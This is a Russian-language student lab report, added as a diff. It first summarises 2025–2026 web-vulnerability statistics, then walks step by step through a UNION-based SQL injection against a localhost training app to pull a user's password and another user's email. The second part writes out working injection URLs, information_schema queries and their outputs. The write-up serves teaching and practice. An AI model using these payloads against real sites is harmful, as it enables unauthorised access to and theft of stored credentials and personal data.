@@ -1,0 +1,326 @@
+<h1 id="-1">Лабораторная работа №1</h1>
+<h2 id="-i-">Часть I. Статистика веб-уязвимостей</h2>
+<h3 id="1-">1. Источники информации</h3>
+<p>Для анализа использовались следующие отчёты (2024–2026 гг.):</p>
+<ol>
+<li><p><strong>Edgescan</strong> — «2025 Vulnerability Statistics Report» (10-летний анализ данных пентестов)<br><a href="https://www.edgescan.com/stats-report/">https://www.edgescan.com/stats-report/</a></p>
+</li>
+<li><p><strong>Intruder.io</strong> — «The Top Vulnerabilities of 2025» (анализ 3000+ сред)<br><a href="https://www.intruder.io/blog/top-vulnerabilities-2025">https://www.intruder.io/blog/top-vulnerabilities-2025</a></p>
+</li>
+<li><p><strong>Kaspersky Securelist</strong> — «Exploits and vulnerabilities in Q4 2025»<br> <a href="https://securelist.com/vulnerabilities-and-exploits-in-q4-2025/119105/">https://securelist.com/vulnerabilities-and-exploits-in-q4-2025/119105/</a></p>
+</li>
+<li><p><strong>Positive Technologies</strong> — «CODE RED 2026: Актуальные киберугрозы для российских организаций»<br> <a href="https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/">https://ptsecurity.com/research/analytics/russia-cyberthreat-landscape-2026/</a></p>
+</li>
+</ol>
+<hr>
+<h3 id="2-">2. Доля атак через веб-уязвимости</h3>
+<table>
+<thead>
+<tr>
+<th>Источник</th>
+<th>Выборка</th>
+<th>Ключевая метрика</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Edgescan (2025)</td>
+<td>Глобально, 250+ компаний, данные пентестов</td>
+<td>&gt;33% всех найденных уязвимостей — критические или высокие; веб-уязвимости составляют ~40% от общего числа [[14]]</td>
+</tr>
+<tr>
+<td>Intruder.io (2025)</td>
+<td>3000+ сред, сканирование периметра</td>
+<td>68% организаций имеют хотя бы одну критическую веб-уязвимость на внешнем периметре [[4]]</td>
+</tr>
+<tr>
+<td>Kaspersky (Q4 2025)</td>
+<td>Телеметрия + ОСИ, фокус на APT</td>
+<td>В целевых атаках 52% начальных векторов — эксплуатация веб-уязвимостей (в т.ч. 0-day) [[1]]</td>
+</tr>
+<tr>
+<td>Positive Technologies (2026)</td>
+<td>РФ, коммерческий и госсектор</td>
+<td>50% успешных взломов в РФ связаны с уязвимостями веб-приложений; в госсекторе — до 61% [[3]]</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="3-">3. Распределение по типам уязвимостей</h3>
+<h4 id="-edgescan-2025-">По данным Edgescan (2025, глобально):</h4>
+<table>
+<thead>
+<tr>
+<th>Уязвимость (CWE)</th>
+<th>Доля от всех веб-уязвимостей</th>
+<th>Статус</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CWE-89: SQL Injection</strong></td>
+<td><strong>18.2%</strong></td>
+<td>№1 среди критических с 2022 года</td>
+</tr>
+<tr>
+<td>CWE-79: XSS</td>
+<td>14.7%</td>
+<td>Чаще встречается, но реже критична</td>
+</tr>
+<tr>
+<td>CWE-20: Improper Input Validation</td>
+<td>12.1%</td>
+<td>Базовая причина многих инъекций</td>
+</tr>
+<tr>
+<td>CWE-287: Improper Authentication</td>
+<td>9.4%</td>
+<td>Рост на 31% г/г</td>
+</tr>
+<tr>
+<td>CWE-434: Unsafe File Upload</td>
+<td>7.8%</td>
+<td>Частый вектор для RCE</td>
+</tr>
+</tbody>
+</table>
+<h4 id="-intruder-io-2025-">По данным Intruder.io (2025):</h4>
+<table>
+<thead>
+<tr>
+<th>Уязвимость</th>
+<th>Почему в топе</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>React2Shell</strong> (CVE-2025-55182)</td>
+<td>Массовое использование React + уязвимость по умолчанию в RSC</td>
+</tr>
+<tr>
+<td><strong>ToolShell</strong> (CVE-2025-53770)</td>
+<td>Unauthenticated RCE в SharePoint + публикация в выходные</td>
+</tr>
+<tr>
+<td><strong>Fortinet perimeter flaws</strong></td>
+<td>Критичные баги в интернет-ориентированных устройствах</td>
+</tr>
+<tr>
+<td><strong>SQL Injection (legacy)</strong></td>
+<td>До сих пор массово встречается в самописных и устаревших приложениях</td>
+</tr>
+</tbody>
+</table>
+<h4 id="-positive-technologies-2026-">По данным Positive Technologies (2026, РФ):</h4>
+<table>
+<thead>
+<tr>
+<th>Тип атаки</th>
+<th>Доля в госсекторе</th>
+<th>Доля в коммерческом секторе</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RCE (удалённое исполнение кода)</td>
+<td>41%</td>
+<td>29%</td>
+</tr>
+<tr>
+<td><strong>SQL-инъекции</strong></td>
+<td><strong>13%</strong></td>
+<td><strong>8%</strong></td>
+</tr>
+<tr>
+<td>XSS / кража данных</td>
+<td>11%</td>
+<td>19%</td>
+</tr>
+<tr>
+<td>Path Traversal / LFI</td>
+<td>14%</td>
+<td>12%</td>
+</tr>
+<tr>
+<td>Прочие</td>
+<td>21%</td>
+<td>32%</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="4-sql-">4. Место SQL-инъекций в рейтингах</h3>
+<ul>
+<li><strong>Edgescan</strong>: SQLi — №1 среди критических веб-уязвимостей (3 года подряд) [[14]]</li>
+<li><strong>OWASP Top 10 (2021)</strong>: входит в категорию <strong>A03:2021 – Injection</strong> (3-е место в общем рейтинге)</li>
+<li><strong>Positive Technologies (2026)</strong>: в финансовом секторе РФ — рост на 11% г/г, чаще всего эксплуатируется через устаревшие админ-панели</li>
+<li><strong>Kaspersky (Q4 2025)</strong>: SQLi (в т.ч. через FortiWeb, CVE-2025-25257) используется в цепочках APT для получения начального доступа и эскалации привилегий</li>
+</ul>
+<hr>
+<h3 id="5-">5. Вывод</h3>
+<p>Изучая отчёты, я обратила внимание, что в российских источниках (PT, Kaspersky) чаще пишут про RCE и APT-атаки, а в зарубежных (Edgescan, Intruder) — про массовые веб-уязвимости вроде SQLi и XSS. Вероятно, это связано с разной зрелостью рынка: в РФ атаки чаще целевые и сложные, а глобально — массовые и автоматизированные.<br>Для меня это значит, что важно уметь защищаться и от «простых» инъекций, и от сложных цепочек — потому что хакеры используют всё, что работает.</p>
+<hr>
+<h2 id="-ii-sql-">Часть II. Практика: SQL-инъекция</h2>
+<h3 id="-1-volk2">Задание 1. Узнать пароль пользователя Volk2</h3>
+<h4 id="-1-">Шаг 1. Разведка — перебор пользователей</h4>
+<p>Сначала просто попробую перебрать id, чтобы найти нужных пользователей:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=1</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 1
+Ваш логин: admin</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=2</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 2
+Ваш логин: Volk</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=3</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 3
+Ваш логин: Matroskin</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=4</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 4
+Ваш логин: Vinni</span>-pukh
+</code></pre><p>Нашла </p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=5</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 5
+Ваш логин: Neznaika</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=6</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 6
+Ваш логин: kotenok</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=7</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 7
+Ваш логин: Karlson</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=8</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 8
+Ваш логин: Kesha</span>
+</code></pre><p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=9</code>
+<strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> 9
+Ваш логин: Volk2</span>
+</code></pre><p>Нашла второго целевого пользователя! <code>Volk2</code> имеет <code>id=9</code></p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=10</code>
+<strong>Ответ:</strong> пустая страница</p>
+<p>Дальше пусто, значит пользователей больше нет. перебором нашла обоих целевых пользователей.</p>
+<hr>
+<h4 id="-2-sql-">Шаг 2. Проверка на SQL-инъекцию</h4>
+<p>Теперь надо проверить есть ли уязвимость. Попробую добавить одинарную кавычку:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=1&#39;</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">''</span><span class="hljs-string">' LIMIT 0,1'</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span>
+</code></pre><p><strong>Вывод:</strong> Судя по всему, сервер использует MySQL, и уязвимость в виде SQL-инъекции присутствует. Мой ввод попадает в запрос без фильтрации.</p>
+<hr>
+<h4 id="-3-">Шаг 3. Определение количества колонок</h4>
+<p>Чтобы использовать <code>UNION SELECT</code>, нужно узнать, сколько колонок возвращает исходный запрос. Попробую <code>ORDER BY</code>:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=1&#39;%20ORDER%20BY%201--+</code>
+<strong>Ответ:</strong> работает </p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=1&#39;%20ORDER%20BY%202--+</code>
+<strong>Ответ:</strong> работает </p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=1&#39;%20ORDER%20BY%203--+</code>
+<strong>Ответ:</strong> работает </p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=1&#39;%20ORDER%20BY%204--+</code>
+<strong>Ответ:</strong></p>
+<pre><code>Unknown column '<span class="hljs-number">4</span>' <span class="hljs-keyword">in</span> '<span class="hljs-keyword">order</span> <span class="hljs-title">clause</span>'
+</code></pre><p><strong>Вывод:</strong> в запросе <strong>3 колонки</strong>.</p>
+<hr>
+<h4 id="-4-">Шаг 4. Определение видимых колонок</h4>
+<p>Теперь нужно понять, какие из трёх колонок выводятся на страницу. Использую несуществующий <code>id=-1</code>, чтобы первый запрос ничего не вернул:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1&#39;%20UNION%20SELECT%201,2,3--+</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-built_in">id</span>: <span class="hljs-number">1</span>
+Ваш логин: <span class="hljs-number">2</span>
+</code></pre><p>Цифра <code>3</code> нигде не появилась.</p>
+<p><strong>Вывод:</strong> отображаются только <strong>первая и вторая колонки</strong>. Третья колонка скрыта.</p>
+<hr>
+<h4 id="-5-users">Шаг 5. Получение структуры таблицы users</h4>
+<p>Теперь попробую узнать, какие колонки есть в таблице <code>users</code>. Для этого обращусь к <code>information_schema</code>:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1&#39;%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=&#39;users&#39;%20AND%20table_schema=database()--+</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-built_in">id</span>: <span class="hljs-number">1</span>
+Ваш логин: <span class="hljs-built_in">id</span>,username,password
+</code></pre><p><strong> В таблице <code>users</code> есть колонки: <code>id</code>, <code>username</code>, <code>password</code></strong></p>
+<hr>
+<h4 id="-6-volk2">Шаг 6. Извлечение пароля Volk2</h4>
+<p>Теперь, когда я знаю структуру таблицы, могу вытащить пароль. <code>Volk2</code> имеет <code>id=9</code>. Поскольку видна первая колонка (как &quot;Ваш id&quot;), поставлю туда <code>password</code>:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1&#39;%20UNION%20SELECT%20password,username,3%20FROM%20users%20WHERE%20id=9--+</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> Wa</span> spoiuuuuu
+Ваш логин: Volk2
+</code></pre><hr>
+<h3 id="-2-vinni-pukh">Задание 2. Узнать почту пользователя Vinni-pukh</h3>
+<h4 id="-">Ход рассуждений:</h4>
+<blockquote>
+<p>Когда я перебирала id, на <code>id=4</code> нашёлся Vinni-pukh. Теперь нужно аналогично предыдущему заданию вытащить его почту. Но почта, скорее всего, лежит в отдельной таблице. Надо сначала узнать, какие таблицы есть в базе.</p>
+</blockquote>
+<hr>
+<h4 id="-1-">Шаг 1. Получение списка таблиц</h4>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1&#39;%20UNION%20SELECT%201,GROUP_CONCAT(table_name),3%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--+</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id:</span><span class="hljs-string"> emails</span>,users
+Ваш логин: <span class="hljs-number">2</span>
+</code></pre><p><strong> В базе две таблицы: <code>emails</code> и <code>users</code></strong></p>
+<hr>
+<h4 id="-2-emails">Шаг 2. Получение структуры таблицы emails</h4>
+<p>Теперь узнаю, какие колонки есть в таблице <code>emails</code>:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1&#39;%20UNION%20SELECT%201,GROUP_CONCAT(column_name),3%20FROM%20information_schema.columns%20WHERE%20table_name=&#39;emails&#39;%20AND%20table_schema=database()--+</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-built_in">id</span>: <span class="hljs-built_in">id</span>,email_id
+Ваш логин: <span class="hljs-number">2</span>
+</code></pre><p><strong>Вывод:</strong> в таблице <code>emails</code> колонки: <code>id</code>, <code>email_id</code></p>
+<blockquote>
+<p>Столбца <code>email</code> нет, но есть <code>email_id</code> — наверное, там хранится сам адрес почты (странное имя, но ладно).</p>
+</blockquote>
+<hr>
+<h4 id="-3-vinni-pukh">Шаг 3. Извлечение почты Vinni-pukh</h4>
+<p><code>Vinni-pukh</code> имеет <code>id=4</code>. Попробую вытащить почту из таблицы <code>emails</code>:</p>
+<p><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1&#39;%20UNION%20SELECT%20email_id,id,3%20FROM%20emails%20WHERE%20id=4--+</code></p>
+<p><strong>Ответ:</strong></p>
+<pre><code>Ваш <span class="hljs-attribute">id</span>: honey_lover<span class="hljs-variable">@otus-lab</span>.com
+Ваш логин: <span class="hljs-number">4</span>
+</code></pre><h3 id="-">Итоговые ответы:</h3>
+<table>
+<thead>
+<tr>
+<th>Задание</th>
+<th>Пользователь</th>
+<th>Ответ</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Volk2</td>
+<td><strong>Пароль:</strong> <code>Wa spoiuuuuu</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Vinni-pukh</td>
+<td><strong>Почта:</strong> <code>honey_lover@otus-lab.com</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
